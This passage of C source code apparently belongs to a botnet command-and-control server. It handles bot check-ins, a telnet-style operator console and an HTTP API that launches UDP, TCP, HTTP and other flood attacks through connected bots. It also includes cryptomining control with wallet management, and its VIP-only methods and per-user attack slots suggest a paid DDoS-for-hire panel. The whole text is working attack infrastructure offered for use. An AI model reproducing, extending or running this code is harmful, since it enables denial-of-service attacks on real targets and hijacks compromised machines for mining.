    char* token = strtok(info, " ");
    while (token != NULL) {
        if (strstr(token, "arch=") == token) {
            strncpy(session->architecture, token + 5, sizeof(session->architecture) - 1);
        } else if (strstr(token, "platform=") == token) {
            strncpy(session->platform, token + 9, sizeof(session->platform) - 1);
        } else if (strstr(token, "device=") == token) {
            strncpy(session->device_type, token + 7, sizeof(session->device_type) - 1);
        }
        token = strtok(NULL, " ");
    }
    
    printf("Bot %s updated info: arch=%s, platform=%s, device=%s\n", 
           session->ip, session->architecture, session->platform, session->device_type);
}

void* handle_bot_connection(void* param) {
    ClientSession* session = (ClientSession*)param;
    int client_sock = session->socket;
    
    char buffer[BUFFER_SIZE];
    fd_set read_fds;
    struct timeval timeout;
    
    strcpy(session->architecture, "unknown");
    strcpy(session->platform, "unknown"); 
    strcpy(session->device_type, "unknown");
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(client_sock, &read_fds);
        
        timeout.tv_sec = 300;
        timeout.tv_usec = 0;
        
        int activity = select(client_sock + 1, &read_fds, NULL, NULL, &timeout);
        
        if (activity < 0) {
            break;
        }
        
        if (activity == 0) {
            continue;
        }
        
        if (FD_ISSET(client_sock, &read_fds)) {
            int bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
            if (bytes_received <= 0) {
                break;
            }
            
            buffer[bytes_received] = '\0';
            
            if (strstr(buffer, "/x86") != NULL) {
                if (!check_blacklist_x86_downloads(session->ip, buffer)) {
                    break;
                }
            }
            
            if (strstr(buffer, "SYSINFO") == buffer) {
                handle_bot_system_info(session, buffer);
            }
        }
    }
    
    cleanup_bot(session);
    return NULL;
}

void kick_all_bots(int client_sock) {
    pthread_mutex_lock(&bot_mutex);
    
    int kicked_count = 0;
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            close(connected_bots[i]->socket);
            free(connected_bots[i]);
            connected_bots[i] = NULL;
            kicked_count++;
        }
    }
    
    bot_count = 0;
    
    char kick_msg[256];
    sprintf(kick_msg, "Kicked all %d bots!\r\n", kicked_count);
    send(client_sock, kick_msg, strlen(kick_msg), MSG_NOSIGNAL);
    
    pthread_mutex_unlock(&bot_mutex);
}

void kick_all_users(int client_sock) {
    int kicked_count = 0;
    
    pthread_mutex_lock(&conn_mutex);
    pthread_mutex_lock(&online_mutex);
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && !connected_bots[i]->is_bot && connected_bots[i]->active) {
            close(connected_bots[i]->socket);
            free(connected_bots[i]);
            connected_bots[i] = NULL;
            kicked_count++;
            active_connections--;
            online_users--;
        }
    }
    
    pthread_mutex_unlock(&online_mutex);
    pthread_mutex_unlock(&conn_mutex);
    
    char kick_msg[256];
    sprintf(kick_msg, "Kicked all %d users!\r\n", kicked_count);
    send(client_sock, kick_msg, strlen(kick_msg), MSG_NOSIGNAL);
}

void* handle_user_connection(void* param) {
    ClientSession* session = (ClientSession*)param;
    int client_sock = session->socket;
    session->active = 1;

    pthread_t title_thread;
    pthread_create(&title_thread, NULL, title_updater, session);

    update_title(session);
    send_prompt(client_sock, session->username);

    while (1) {
        char command[BUFFER_SIZE] = {0};
        char buffer[BUFFER_SIZE];
        char attack_command[BUFFER_SIZE];

        memset(buffer, 0, sizeof(buffer));

        int bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            break;
        }

        char cleaned[BUFFER_SIZE];
        int bi = 0, ci = 0;
        while (bi < bytes_received && ci < (int)sizeof(cleaned) - 1) {
            unsigned char uc = (unsigned char)buffer[bi];
            if (uc == IAC) {
                bi++;
                if (bi < bytes_received) bi++;
                if (bi < bytes_received) bi++;
                continue;
            }
            if (uc == '\r' || uc == '\n' || uc == '\t' || (uc >= 32 && uc <= 126)) {
                cleaned[ci++] = (char)uc;
            }
            bi++;
        }
        cleaned[ci] = '\0';

        if (ci == 0) {
            continue;
        }

        char* command_start = cleaned;
        while (*command_start == '\r' || *command_start == '\n' || *command_start == ' ' || *command_start == '\t') command_start++;
        if (*command_start == '\0') {
            continue;
        }

        char* newline = strchr(command_start, '\r');
        if (!newline) newline = strchr(command_start, '\n');

        if (newline) {
            *newline = '\0';
            strncpy(command, command_start, BUFFER_SIZE - 1);
            command[BUFFER_SIZE - 1] = '\0';
        } else {
            strncpy(command, command_start, BUFFER_SIZE - 1);
            command[BUFFER_SIZE - 1] = '\0';
        }

        if (strlen(command) == 0) continue;

        if (strncmp(command, "width:", 6) == 0) {
            int width = atoi(command + 6);
            if (width > 0) {
                set_terminal_size(client_sock, width, 24);
                send(client_sock, "Terminal width set successfully!\r\n", 33, MSG_NOSIGNAL);
            }
        } else if (strncmp(command, "length:", 7) == 0) {
            int length = atoi(command + 7);
            if (length > 0) {
                set_terminal_size(client_sock, 80, length);
                send(client_sock, "Terminal length set successfully!\r\n", 34, MSG_NOSIGNAL);
            }
        } else if (strncmp(command, "size:", 5) == 0) {
            int width, length;
            if (sscanf(command + 5, "%dx%d", &width, &length) == 2) {
                if (width > 0 && length > 0) {
                    set_terminal_size(client_sock, width, length);
                    send(client_sock, "Terminal size set successfully!\r\n", 32, MSG_NOSIGNAL);
                }
            }
        } else if (strcmp(command, "help") == 0) {
            send_help(client_sock);
        } else if (strcmp(command, "h") == 0) {
            send_help(client_sock);
        } else if (strcmp(command, "methods") == 0) {
            send_methods(client_sock);
        } else if (strcmp(command, "m") == 0) {
            send_methods(client_sock);
        } else if (strcmp(command, "?") == 0) {
            send_methods(client_sock);
        } else if (strcmp(command, "mine start") == 0) {
            send(client_sock, "Usage: mine start <wallet_address>\r\n", 36, MSG_NOSIGNAL);
        } else if (strncmp(command, "mine start ", 11) == 0) {
            char* wallet = command + 11;
            if (strlen(wallet) > 0) {
                start_mining_bots(wallet, 1);
                char msg[256];
                sprintf(msg, "Mining started with wallet: %s\r\n", wallet);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "mine stop") == 0) {
            stop_mining_bots();
            send(client_sock, "Mining stopped on all bots\r\n", 28, MSG_NOSIGNAL);
        } else if (strcmp(command, "mine list") == 0) {
            list_mining_wallets(client_sock);
        } else if (strncmp(command, "mine wallet add ", 16) == 0) {
            char* wallet = command + 16;
            if (strlen(wallet) > 0) {
                add_mining_wallet(client_sock, wallet);
            }
        } else if (strncmp(command, "mine wallet remove ", 19) == 0) {
            int wallet_id = atoi(command + 19);
            if (wallet_id > 0) {
                remove_mining_wallet(client_sock, wallet_id);
            } else {
                send(client_sock, "Invalid wallet ID!\r\n", 20, MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "mine") == 0) {
            send(client_sock, "Mining commands:\r\n", 18, MSG_NOSIGNAL);
            send(client_sock, "  mine start <wallet> [threads] - Start mining\r\n", 46, MSG_NOSIGNAL);
            send(client_sock, "  mine stop                    - Stop mining\r\n", 44, MSG_NOSIGNAL);
            send(client_sock, "  mine list                    - List mining sessions\r\n", 50, MSG_NOSIGNAL);
            send(client_sock, "  mine wallet add <wallet>     - Add wallet\r\n", 44, MSG_NOSIGNAL);
            send(client_sock, "  mine wallet remove <id>      - Remove wallet\r\n", 46, MSG_NOSIGNAL);
        } else if (strcmp(command, "bots") == 0) {
            send_bots_info(client_sock);
        } else if (strcmp(command, "ongoing") == 0) {
            send_ongoing_attacks(client_sock);
        } else if (strncmp(command, "blacklist add ", 14) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char ip[64];
                strcpy(ip, command + 14);
                add_to_blacklist(ip);
                char msg[128];
                sprintf(msg, "IP %s added to blacklist.\r\n", ip);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strncmp(command, "blacklist remove ", 17) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char ip[64];
                strcpy(ip, command + 17);
                remove_from_blacklist(ip);
                char msg[128];
                sprintf(msg, "IP %s removed from blacklist.\r\n", ip);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "blacklist list") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                list_blacklist(client_sock);
            }
        } else if (strncmp(command, "blacklist arch ", 15) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char arch[64];
                strcpy(arch, command + 15);
                add_arch_to_blacklist(arch);
        
                kick_bots_by_arch(arch);
        
                char msg[128];
                sprintf(msg, "Architecture %s added to blacklist and %d existing bots kicked.\r\n", arch, bot_count);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "whitelist") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                send(client_sock, "Whitelist commands:\r\n", 22, MSG_NOSIGNAL);
                send(client_sock, "  add <ip>    - Add IP\r\n", 24, MSG_NOSIGNAL);
                send(client_sock, "  remove <ip> - Remove IP\r\n", 26, MSG_NOSIGNAL);
                send(client_sock, "  list        - List IPs\r\n", 25, MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "blacklist") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                send(client_sock, "Blacklist commands:\r\n", 22, MSG_NOSIGNAL);
                send(client_sock, "  add <ip>    - Add IP\r\n", 24, MSG_NOSIGNAL);
                send(client_sock, "  remove <ip> - Remove IP\r\n", 26, MSG_NOSIGNAL);
                send(client_sock, "  list        - List IPs\r\n", 25, MSG_NOSIGNAL);
                send(client_sock, "  arch <arch> - Add arch\r\n", 25, MSG_NOSIGNAL);
                send(client_sock, "  unarch <arch> - Remove arch\r\n", 30, MSG_NOSIGNAL);
                send(client_sock, "  arch list   - List archs\r\n", 27, MSG_NOSIGNAL);
            }
        } else if (strncmp(command, "unblacklist arch ", 17) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char arch[64];
                strcpy(arch, command + 17);
                remove_arch_from_blacklist(arch);
                char msg[128];
                sprintf(msg, "Architecture %s removed from blacklist.\r\n", arch);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "blacklist arch list") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                list_arch_blacklist(client_sock);
            }
        } else if (strncmp(command, "whitelist add ", 14) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char ip[64];
                strcpy(ip, command + 14);
                add_to_whitelist(ip);
                char msg[128];
                sprintf(msg, "IP %s added to whitelist.\r\n", ip);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strncmp(command, "whitelist remove ", 17) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char ip[64];
                strcpy(ip, command + 17);
                remove_from_whitelist(ip);
                char msg[128];
                sprintf(msg, "IP %s removed from whitelist.\r\n", ip);
                send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
            }
        } else if (strcmp(command, "whitelist list") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                list_whitelist(client_sock);
            }
        } else if (strcmp(command, "plan") == 0) {
            send_plan(client_sock, session);
        } else if (strcmp(command, "stop") == 0) {
            send_stop_to_bots();
            stop_all_ongoing_attacks();
            send(client_sock, "Stop command successfully sent to -1 bots\r\n", 43, MSG_NOSIGNAL);
        } else if (strcmp(command, "clear") == 0) {
            send(client_sock, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            send_main(client_sock, session);
        } else if (strcmp(command, "kick all bots") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                kick_all_bots(client_sock);
            }
        } else if (strcmp(command, "kick all users") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                kick_all_users(client_sock);
            }
        } else if (strcmp(command, "list bots") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                list_bots(client_sock);
            }
        } else if (strcmp(command, "list users") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                list_users(client_sock);
            }
        } else if (strncmp(command, "kick bot ", 9) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                int bot_id = atoi(command + 9);
                if (bot_id > 0) {
                    kick_bot(client_sock, bot_id);
                } else {
                    send(client_sock, "Invalid bot ID!\r\n", 17, MSG_NOSIGNAL);
                }
            }
        } else if (strncmp(command, "kick user ", 10) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                int user_id = atoi(command + 10);
                if (user_id > 0) {
                    kick_user(client_sock, user_id);
                } else {
                    send(client_sock, "Invalid user ID!\r\n", 18, MSG_NOSIGNAL);
                }
            }
        } else if (strcmp(command, "add") == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                add_user_command(client_sock);
            }
        } else if (strcmp(command, "botcount") == 0) {
            pthread_mutex_lock(&bot_mutex);
            char count_msg[128];
            sprintf(count_msg, "Total bots connected: %d\r\n", bot_count);
            send(client_sock, count_msg, strlen(count_msg), MSG_NOSIGNAL);
            pthread_mutex_unlock(&bot_mutex);
        } else if (strncmp(command, "kick ip ", 8) == 0) {
            if (!session->admin) {
                send(client_sock, "Admin only command!\r\n", 21, MSG_NOSIGNAL);
            } else {
                char target_ip[64];
                strcpy(target_ip, command + 8);
                
                pthread_mutex_lock(&bot_mutex);
                int kicked = 0;
                for (int i = 0; i < MAX_BOTS; i++) {
                    if (connected_bots[i] != NULL && connected_bots[i]->is_bot && 
                        connected_bots[i]->active && strcmp(connected_bots[i]->ip, target_ip) == 0) {
                        
                        char kick_msg[256];
                        sprintf(kick_msg, "Kicking bot with IP: %s\r\n", target_ip);
                        send(client_sock, kick_msg, strlen(kick_msg), MSG_NOSIGNAL);
                        
                        close(connected_bots[i]->socket);
                        free(connected_bots[i]);
                        connected_bots[i] = NULL;
                        bot_count--;
                        kicked = 1;
                        break;
                    }
                }
                
                if (!kicked) {
                    char not_found_msg[128];
                    sprintf(not_found_msg, "No bot found with IP: %s\r\n", target_ip);
                    send(client_sock, not_found_msg, strlen(not_found_msg), MSG_NOSIGNAL);
                }
                pthread_mutex_unlock(&bot_mutex);
            }
        } else if (strstr(command, "udp") == command ||
                   strstr(command, "icmp-hex") == command ||
                   strstr(command, "udp-hex") == command ||
                   strstr(command, "http") == command ||
                   strstr(command, "https") == command ||
                   strstr(command, "pps") == command ||
                   strstr(command, "std") == command ||
                   strstr(command, "home") == command ||
                   strstr(command, "stdhex") == command ||
                   strstr(command, "tcp") == command ||
                   strstr(command, "game") == command) {

            char method[32], ip[64], time_val[32], port[32];
            int bot_count_to_send, packet_size, pps_rate, connections;

            parse_attack_command(command, method, ip, time_val, port, &bot_count_to_send, &packet_size, &pps_rate, &connections);

            if ((strcmp(method, "home") == 0 ||
                 strcmp(method, "game") == 0 ||
                 strcmp(method, "udp-bypass") == 0) && !session->vip) {
                send(client_sock, "VIP only method!\r\n", 18, MSG_NOSIGNAL);
                send_prompt(client_sock, session->username);
                continue;
            }

            int attack_status = can_launch_attack(session);
            if (attack_status == 0) {
                send(client_sock, "Max attacks reached! Please wait.\r\n", 31, MSG_NOSIGNAL);
                send_prompt(client_sock, session->username);
                continue;
            } else if (attack_status == -1) {
                send(client_sock, "Cooldown active! Please wait.\r\n", 31, MSG_NOSIGNAL);
                send_prompt(client_sock, session->username);
                continue;
            } else {
                if (strlen(ip) == 0 || strlen(port) == 0 || strlen(time_val) == 0) {
                    char error_msg[BUFFER_SIZE];
                    snprintf(error_msg, sizeof(error_msg), 
                            "Missing required parameters!\r\n"
                            "Usage: %s <ip> <time> dport={port} len={len} bots={count}\r\n"
                            "Missing: ", method);
                    if (strlen(ip) == 0) strncat(error_msg, "IP ", sizeof(error_msg) - strlen(error_msg) - 1);
                    if (strlen(port) == 0) strncat(error_msg, "PORT ", sizeof(error_msg) - strlen(error_msg) - 1);
                    if (strlen(time_val) == 0) strncat(error_msg, "TIME ", sizeof(error_msg) - strlen(error_msg) - 1);
                    strncat(error_msg, "\r\n", sizeof(error_msg) - strlen(error_msg) - 1);
                    send(client_sock, error_msg, strlen(error_msg), MSG_NOSIGNAL);
                    send_prompt(client_sock, session->username);
                    continue;
                }

                strncpy(attack_command, command, sizeof(attack_command) - 1);
                attack_command[sizeof(attack_command) - 1] = '\0';

                if (packet_size != 1400) {
                    size_t cur_len = strlen(attack_command);
                    if (cur_len < sizeof(attack_command) - 1) {
                        snprintf(attack_command + cur_len, sizeof(attack_command) - cur_len, " len=%d", packet_size);
                    }
                }
                if (bot_count_to_send != -1) {
                    size_t cur_len = strlen(attack_command);
                    if (cur_len < sizeof(attack_command) - 1) {
                        snprintf(attack_command + cur_len, sizeof(attack_command) - cur_len, " bots=%d", bot_count_to_send);
                    }
                }

                session->last_attack = time(NULL);
                send_to_bots_count(attack_command, bot_count_to_send);
                add_ongoing_attack(method, ip, port, time_val, packet_size,
                               bot_count_to_send == -1 ? bot_count : bot_count_to_send, session);

                send_attack_info(client_sock, ip, port, time_val, method,
                             bot_count_to_send == -1 ? bot_count : bot_count_to_send);
            }
        } else {
            char error_msg[BUFFER_SIZE];
            size_t prefix_len = strlen("Invalid command: ");
            int max_cmd = (int)(sizeof(error_msg) - prefix_len - 3);
            if (max_cmd < 0) max_cmd = 0;
            snprintf(error_msg, sizeof(error_msg), "Invalid command: %.*s\r\n", max_cmd, command);
            send(client_sock, error_msg, strlen(error_msg), MSG_NOSIGNAL);
        }
        
        send_prompt(client_sock, session->username);
        log_command(session->username, command, session->ip);
    }

    session->active = 0;
    pthread_cancel(title_thread);

    pthread_mutex_lock(&conn_mutex);
    active_connections--;
    pthread_mutex_unlock(&conn_mutex);

    close(client_sock);
    free(session);
    return NULL;
}

void stop_mining_bots() {
    pthread_mutex_lock(&bot_mutex);
    
    char stop_command[] = "mine stop\r\n";
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            send(connected_bots[i]->socket, stop_command, strlen(stop_command), MSG_NOSIGNAL);
        }
    }
    
    mining_enabled = 0;
    if (current_mining_wallet) {
        free(current_mining_wallet);
        current_mining_wallet = NULL;
    }
    
    pthread_mutex_lock(&mining_mutex);
    for (int i = 0; i < mining_count; i++) {
        mining_sessions[i].active = 0;
    }
    pthread_mutex_unlock(&mining_mutex);
    
    pthread_mutex_unlock(&bot_mutex);
}


void list_mining_wallets(int client_sock) {
    pthread_mutex_lock(&mining_mutex);
    
    char msg[256];
    sprintf(msg, "Active Mining Sessions: %d\r\n", mining_count);
    send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
    
    if (mining_count == 0) {
        send(client_sock, "No active mining sessions\r\n", 27, MSG_NOSIGNAL);
    } else {
        send(client_sock, "ID | Wallet | Threads | Status | Uptime\r\n", 41, MSG_NOSIGNAL);
        send(client_sock, "----------------------------------------\r\n", 42, MSG_NOSIGNAL);
        
        for (int i = 0; i < mining_count; i++) {
            time_t uptime = time(NULL) - mining_sessions[i].start_time;
            int hours = uptime / 3600;
            int minutes = (uptime % 3600) / 60;
            int seconds = uptime % 60;
            
            sprintf(msg, "%-2d | %-40s | %-7d | %-6s | %02d:%02d:%02d\r\n", 
                    i + 1, 
                    mining_sessions[i].wallet,
                    mining_sessions[i].thread_count,
                    mining_sessions[i].active ? "Active" : "Stopped",
                    hours, minutes, seconds);
            send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
        }
    }
    
    pthread_mutex_unlock(&mining_mutex);
}


void add_mining_wallet(int client_sock, const char* wallet) {
    pthread_mutex_lock(&mining_mutex);
    
    if (mining_count < 100) {
        strncpy(mining_sessions[mining_count].wallet, wallet, sizeof(mining_sessions[mining_count].wallet) - 1);
        mining_sessions[mining_count].active = 0;
        mining_sessions[mining_count].thread_count = 1;
        mining_sessions[mining_count].start_time = 0;
        mining_sessions[mining_count].pid = 0;
        mining_sessions[mining_count].hash_rate = 0.0;
        mining_count++;
        
        char msg[256];
        sprintf(msg, "Wallet added: %s\r\n", wallet);
        send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
    } else {
        send(client_sock, "Mining wallet list full!\r\n", 26, MSG_NOSIGNAL);
    }
    
    pthread_mutex_unlock(&mining_mutex);
}


void remove_mining_wallet(int client_sock, int wallet_id) {
    pthread_mutex_lock(&mining_mutex);
    
    if (wallet_id >= 1 && wallet_id <= mining_count) {
        char msg[256];
        sprintf(msg, "Removed wallet: %s\r\n", mining_sessions[wallet_id - 1].wallet);
        send(client_sock, msg, strlen(msg), MSG_NOSIGNAL);
        
        for (int i = wallet_id - 1; i < mining_count - 1; i++) {
            mining_sessions[i] = mining_sessions[i + 1];
        }
        mining_count--;
    } else {
        send(client_sock, "Invalid wallet ID!\r\n", 20, MSG_NOSIGNAL);
    }
    
    pthread_mutex_unlock(&mining_mutex);
}

void* handle_api_request(void* param) {
    int* client_sock_ptr = (int*)param;
    if (!client_sock_ptr) return NULL;
    
    int client_socket = *client_sock_ptr;
    free(client_sock_ptr);
    
    char request_buffer[BUFFER_SIZE] = {0};
    int bytes_received = recv(client_socket, request_buffer, BUFFER_SIZE - 1, 0);
    
    if (bytes_received <= 0) {
        close(client_socket);
        return NULL;
    }
    
    request_buffer[bytes_received] = '\0';
    
    ApiRequest api_req;
    memset(&api_req, 0, sizeof(api_req));
    
    char* api_start = strstr(request_buffer, "/api");
    if (api_start) {
        char* query_start = strchr(api_start, '?');
        if (query_start) {
            char* http_end = strstr(query_start, " HTTP/");
            if (http_end) {
                *http_end = '\0';
            }
            
            char query_copy[BUFFER_SIZE];
            strncpy(query_copy, query_start + 1, sizeof(query_copy) - 1);
            query_copy[sizeof(query_copy) - 1] = '\0';
            
            char* token = strtok(query_copy, "&");
            while (token != NULL) {
                char* equals = strchr(token, '=');
                if (equals) {
                    *equals = '\0';
                    char* value = equals + 1;
                    
                    if (strcmp(token, "user") == 0) {
                        strncpy(api_req.username, value, sizeof(api_req.username) - 1);
                    } else if (strcmp(token, "pass") == 0) {
                        strncpy(api_req.password, value, sizeof(api_req.password) - 1);
                    } else if (strcmp(token, "target") == 0) {
                        strncpy(api_req.target, value, sizeof(api_req.target) - 1);
                    } else if (strcmp(token, "port") == 0) {
                        strncpy(api_req.port, value, sizeof(api_req.port) - 1);
                    } else if (strcmp(token, "time") == 0) {
                        strncpy(api_req.time_val, value, sizeof(api_req.time_val) - 1);
                    } else if (strcmp(token, "method") == 0) {
                        strncpy(api_req.method, value, sizeof(api_req.method) - 1);
                    }
                }
                token = strtok(NULL, "&");
            }
        }
    }
    
    User* user = find_user(api_req.username, api_req.password);
    char response[1024];
    
    if (!user || !check_expiry(user->expiry)) {
        snprintf(response, sizeof(response), 
                 "HTTP/1.1 401 Unauthorized\r\n"
                 "Content-Type: text/plain\r\n"
                 "Content-Length: 16\r\n"
                 "\r\n"
                 "Invalid credentials");
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }
    
    if (strlen(api_req.target) == 0 || strlen(api_req.port) == 0 || 
        strlen(api_req.time_val) == 0 || strlen(api_req.method) == 0) {
        snprintf(response, sizeof(response),
                 "HTTP/1.1 400 Bad Request\r\n"
                 "Content-Type: text/plain\r\n"
                 "Content-Length: 19\r\n"
                 "\r\n"
                 "Missing parameters");
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }
    
    if ((strcmp(api_req.method, "home") == 0 ||
         strcmp(api_req.method, "game") == 0 ||
         strcmp(api_req.method, "udp-bypass") == 0) && !user->vip) {
        snprintf(response, sizeof(response),
                 "HTTP/1.1 403 Forbidden\r\n"
                 "Content-Type: text/plain\r\n"
                 "Content-Length: 15\r\n"
                 "\r\n"
                 "VIP only method");
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }
    
    int current_user_attacks = 0;
    pthread_mutex_lock(&attack_mutex);
    for (int i = 0; i < ongoing_count; i++) {
        if (ongoing_attacks[i].active && ongoing_attacks[i].owner && 
            ongoing_attacks[i].owner->user_info &&
            strcmp(ongoing_attacks[i].owner->username, api_req.username) == 0) {
            current_user_attacks++;
        }
    }
    pthread_mutex_unlock(&attack_mutex);
    
    if (current_user_attacks >= user->max_attacks) {
        snprintf(response, sizeof(response),
                 "HTTP/1.1 429 Too Many Requests\r\n"
                 "Content-Type: text/plain\r\n"
                 "Content-Length: 17\r\n"
                 "\r\n"
                 "Max attacks reached");
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        close(client_socket);
        return NULL;
    }
    
    char attack_command[BUFFER_SIZE];
    snprintf(attack_command, sizeof(attack_command), "%s %s %s dport=%s",
             api_req.method, api_req.target, api_req.time_val, api_req.port);
    
    send_to_bots_count(attack_command, -1);
    
    ClientSession* temp_owner = (ClientSession*)calloc(1, sizeof(ClientSession));
    if (temp_owner) {
        strncpy(temp_owner->username, api_req.username, sizeof(temp_owner->username)-1);
        temp_owner->user_info = user;
        temp_owner->current_attacks = current_user_attacks + 1;
    }
    
    pthread_mutex_lock(&attack_mutex);
    if (ongoing_count < 100) {
        strncpy(ongoing_attacks[ongoing_count].method, api_req.method, sizeof(ongoing_attacks[ongoing_count].method)-1);
        strncpy(ongoing_attacks[ongoing_count].ip, api_req.target, sizeof(ongoing_attacks[ongoing_count].ip)-1);
        strncpy(ongoing_attacks[ongoing_count].port, api_req.port, sizeof(ongoing_attacks[ongoing_count].port)-1);
        strncpy(ongoing_attacks[ongoing_count].duration, api_req.time_val, sizeof(ongoing_attacks[ongoing_count].duration)-1);
        ongoing_attacks[ongoing_count].packet_size = 1400;
        ongoing_attacks[ongoing_count].bot_count = bot_count;
        ongoing_attacks[ongoing_count].start_time = time(NULL);
        ongoing_attacks[ongoing_count].duration_seconds = atoi(api_req.time_val);
        ongoing_attacks[ongoing_count].owner = temp_owner;
        ongoing_attacks[ongoing_count].active = 1;
        ongoing_count++;
    } else {
        free(temp_owner);
    }
    pthread_mutex_unlock(&attack_mutex);
    
    char* beautiful_response = 
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "Attack Sent!\r\n"
        "Target: %s\r\n"
        "Port: %s\r\n"
        "Time: %s\r\n"
        "Method: %s\r\n"
        "Bots: %d\r\n"
        "Slots: %d/%d\r\n";
    
    snprintf(response, sizeof(response), beautiful_response,
             api_req.target, api_req.port, api_req.time_val, api_req.method,
             bot_count, current_user_attacks + 1, user->max_attacks);
    
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    close(client_socket);
    
    char log_msg[256];
    snprintf(log_msg, sizeof(log_msg), "API Attack - User: %s, Method: %s, Target: %s:%s, Time: %s",
             api_req.username, api_req.method, api_req.target, api_req.port, api_req.time_val);
    log_command(api_req.username, log_msg, "API");
    
    return NULL;
}

void* api_server(void* param) {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(API_PORT);
    
    int reuse = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("API server bind failed");
        close(server_socket);
        return NULL;
    }
    
    listen(server_socket, 1000);
    printf("API server running on port %d...\n", API_PORT);
    
    while (1) {
        int client_socket = accept(server_socket, NULL, NULL);
        if (client_socket >= 0) {
            pthread_t thread_id;
            int* client_sock_ptr = malloc(sizeof(int));
            *client_sock_ptr = client_socket;
            
            pthread_create(&thread_id, NULL, handle_api_request, client_sock_ptr);
            pthread_detach(thread_id);
        }
    }
    
    close(server_socket);
    return NULL;
}
void* handle_bot_port_connection(void* param) {
    int client_sock = *(int*)param;
    free(param);
    
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    getpeername(client_sock, (struct sockaddr*)&client_addr, &addr_len);
    char* client_ip = inet_ntoa(client_addr.sin_addr);
    
    if (is_ip_blacklisted(client_ip)) {
        printf("Blacklisted IP connection attempt: %s\n", client_ip);
        char blacklist_msg[] = "Blacklisted IP!\r\n";
        send(client_sock, blacklist_msg, strlen(blacklist_msg), MSG_NOSIGNAL);
        close(client_sock);
        return NULL;
    }
    
    ClientSession* session = (ClientSession*)malloc(sizeof(ClientSession));
    session->socket = client_sock;
    strcpy(session->ip, client_ip);
    session->is_bot = 0;
    session->authenticated = 0;
    session->active = 0;
    session->vip = 0;
    session->admin = 0;
    session->max_attacks = 0;
    session->current_attacks = 0;
    session->last_attack = 0;
    session->user_info = NULL;
    
    pthread_mutex_lock(&conn_mutex);
    if (active_connections >= MAX_CONNECTIONS) {
        close(client_sock);
        free(session);
        pthread_mutex_unlock(&conn_mutex);
        return NULL;
    }
    active_connections++;
    pthread_mutex_unlock(&conn_mutex);
    
    if (authenticate_bot(session)) {
